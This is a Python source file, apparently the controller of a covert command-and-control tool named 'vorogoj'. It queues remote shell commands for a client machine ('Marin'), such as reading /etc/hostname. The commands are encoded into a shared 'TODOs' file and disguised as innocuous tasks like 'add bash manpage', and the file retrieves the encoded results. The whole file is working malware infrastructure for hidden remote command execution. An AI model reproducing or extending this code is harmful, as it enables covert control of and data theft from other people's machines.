from json import dumps
from os import listdir
from os.path import join
from random import randint
from urllib.request import urlopen, Request

from constants import gid, gat
from encoding import decode, encode
from myhttp import get_file, update_file

opmap = {
    'w': 'a',
    'cat': 'dog',
    'id': 'ls'
}

has_args = {
    'w': False,
    'cat': True,
    'id': False,
}

def add_todo(name: str, id: str, task: str, operation: str, args: str = ""):
    old = get_file('TODOs')
    argstr = '' if len(args) == 0 else f' {args}'
    new = f'{old}\n- {id} {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
    if update_file('TODOs', new):
        print(f'Added operation "{operation}" for client "{name}" under id {id}')
    else:
        print("Failed to add operation!")

def print_result(cmd: str, id: str):
    res = get_file(f'{cmd}-{id}')
    (head, title, ct) = res.split(f'\n\n')
    print('===')
    print(f'Client command: {decode(head)}\n')
    print(decode(ct))
    print('===')

def print_help():
    print("""The following controller commands are available:
- c\t\t Instruct a client to run a client command
- h\t\t Show this help text
- l\t\t List clients
- q\t\t Quit
- r\t\t Get a client command result""")

def quit():
    if input("Really quit? [y/N]").lower() == 'y':
        print("Goodbye")
        exit(0)
    else:
        print("Not quitting")

class Controller:
    def __init__(self):
        self.clients = []

    def enter_cmd(self):
        i = "Marin"
        # i = input("Client to run on: ")
        # if not i in self.clients:
        #     print("Client not available")
        #     return
        
        c = input("Client command to run: ")
        if not c in opmap:
            print("Unknown command")
            return
        
        args = ""
        if has_args[c]:
            args = input("Command arguments: ")

        man_name = "bash"

        id = randint(0, 1e8)
        print("Please wait...")
        add_todo(i, id, f'add {man_name} manpage', c, args)

    def eval_cmd(self, cmd):
        match cmd:
            case 'c':
                self.enter_cmd()
            case 'h':
                print_help()
            case 'l':
                print("Listing available clients")
                for c in self.clients:
                    print(f' {c}')
            case 'q':
                quit()
            case 'r':
                print_result('bash', input('id: '))
            case _:
                print("Unknown command")

    def shell(self):
        print('Welcome to vorogoj v1')
        print('Use the "h" command for help')
        while True:
            cmd = input('>')
            self.eval_cmd(cmd)

if __name__ == '__main__':
    #add_todo('Marin', '123', 'add bash manpage', 'cat', '/etc/hostname')
    #print_result('bash', '123')
    ctrlr = Controller()
    ctrlr.shell()
